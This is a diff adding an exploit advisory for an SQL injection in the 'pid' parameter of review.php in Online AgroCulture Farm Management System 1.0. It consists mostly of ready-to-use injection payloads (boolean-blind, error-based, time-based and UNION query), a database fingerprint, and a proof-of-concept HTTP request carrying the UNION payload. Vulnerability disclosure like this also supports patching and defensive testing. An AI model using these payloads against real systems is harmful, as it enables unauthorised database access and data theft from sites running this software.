@@ -1,0 +1,51 @@
+# Exploit Title: Online AgroCulture Farm Management System 1.0 - 'pid' SQL Injection
+# Google Dork: N/A
+# Date: 2020-05-07
+# Exploit Author: BKpatron
+# Vendor Homepage: https://www.sourcecodester.com/php/14198/online-agroculture-farm-management-system-phpmysql.html
+# Software Link: https://www.sourcecodester.com/download-code?nid=14198&title=Online+AgroCulture+Farm+Management+System+in+PHP%2FMySQL
+# Version: v1.0
+# Tested on: Win 10
+# CVE: N/A
+# my website: bkpatron.com
+
+# Discription:
+The Online AgroCulture Farm Management System v1.0 application is vulnerable to
+SQL injection via the 'pid' parameter on the review.php page.
+# vulnerable file : review.php
+http://localhost/AgroCulture/review.php?pid=27
+
+Parameter: pid (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: pid=27' AND 5853=5853 AND 'EmvW'='EmvW
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: pid=27' AND (SELECT 9739 FROM(SELECT COUNT(*),CONCAT(0x7170627071,(SELECT (ELT(9739=9739,1))),0x7176626a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'tpnl'='tpnl
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: pid=27' AND (SELECT 7650 FROM (SELECT(SLEEP(5)))bwDl) AND 'IWff'='IWff
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: pid=-6157' UNION ALL SELECT NULL,NULL,CONCAT(0x7170627071,0x6d7a6346644349635a495a424c56644c51666866664553794e674764546a6c67747a69634749516a,0x7176626a71),NULL,NULL,NULL,NULL,NULL-- RXWN
+[INFO] the back-end DBMS is MySQL
+web application technology: PHP, Apache 2.4.39, PHP 7.2.18
+back-end DBMS: MySQL >= 5.0
+
+
+# Proof of Concept:
+http://localhost/vulnerability/ncn/AgroCulture/review.php?pid=sqli
+
+GET AgroCulture/review.php?pid=27 HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie:PHPSESSID=gd27cb23t7m8o57giuvh0f8e7m
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+pid=-6157%27%20UNION%20ALL%20SELECT%20NULL,NULL,CONCAT(0x7170627071,0x6d7a6346644349635a495a424c56644c51666866664553794e674764546a6c67747a69634749516a,0x7176626a71),NULL,NULL,NULL,NULL,NULL--%20RXWN
